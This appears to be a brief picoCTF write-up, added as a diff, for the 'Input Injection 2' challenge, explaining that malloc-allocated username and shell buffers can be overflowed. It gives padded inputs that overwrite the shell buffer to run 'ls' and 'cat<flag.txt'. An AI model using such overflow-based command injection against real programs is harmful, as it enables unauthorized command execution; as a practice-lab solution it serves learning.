@@ -1,0 +1,11 @@
+picoctf Input Injection 2 writeup
+
+1.this challenge is like previous one
+
+2.but it uses malloc to allocate memory to username and shell
+
+3.we can also use same idea 
+
+4.input "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaals" , "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacat<flag.txt"
+
+5.get flag!
